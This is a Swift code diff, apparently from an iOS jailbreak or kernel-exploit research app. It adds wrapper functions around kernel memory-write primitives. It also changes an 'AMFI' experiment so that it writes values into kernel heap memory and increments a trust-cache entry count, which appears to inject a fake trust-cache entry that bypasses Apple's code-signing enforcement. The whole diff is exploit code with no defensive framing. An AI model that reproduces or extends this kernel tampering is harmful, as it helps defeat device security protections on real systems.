@@ -388,6 +388,24 @@ private func safeKwrite16Physmap(_ va: UInt64, _ value: UInt16) -> Bool {
     return true
 }
 
+private func safeKwrite64Heap(_ va: UInt64, _ value: UInt64) -> Bool {
+    guard isSafeKernelHeapKreadAddress(va) else { return false }
+    ds_kwrite64(va, value)
+    return true
+}
+
+private func safeKwrite32Heap(_ va: UInt64, _ value: UInt32) -> Bool {
+    guard isSafeKernelHeapKreadAddress(va) else { return false }
+    ds_kwrite32(va, value)
+    return true
+}
+
+private func safeKwrite16Heap(_ va: UInt64, _ value: UInt16) -> Bool {
+    guard isSafeKernelHeapKreadAddress(va) else { return false }
+    ds_kwrite16(va, value)
+    return true
+}
+
 private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
     if v == 0 { return false }
     if v >= 0xffffff8000000000 { return true }
@@ -5498,11 +5516,11 @@ struct AMFIExperimentView: View {
         // Use our safe direct KRW functions for Zone Map
         // NOTE: we need to ensure ds_kwrite64_safe exists or use what we have.
         // We will just do kwrite64_safe if it exists, or fallback to the primitive.
-        let w1 = ds_kwrite64_safe(injectVA, 0x4141414141414141)
-        let w2 = ds_kwrite64_safe(injectVA + 8, 0x4141414141414141)
-        let w3 = ds_kwrite32_safe(injectVA + 16, 0x41414141)
-        let w4 = ds_kwrite16_safe(injectVA + 20, 0x0002)
-        let w5 = ds_kwrite32_safe(tcStructAddr + 4, UInt32(tcEntryCount + 1))
+        let w1 = safeKwrite64Heap(injectVA, 0x4141414141414141)
+        let w2 = safeKwrite64Heap(injectVA + 8, 0x4141414141414141)
+        let w3 = safeKwrite32Heap(injectVA + 16, 0x41414141)
+        let w4 = safeKwrite16Heap(injectVA + 20, 0x0002)
+        let w5 = safeKwrite32Heap(tcStructAddr + 4, UInt32(tcEntryCount + 1))
         
         guard w1 && w2 && w3 && w4 && w5 else {
             detail += "❌ Direct Heap write failed!\n"
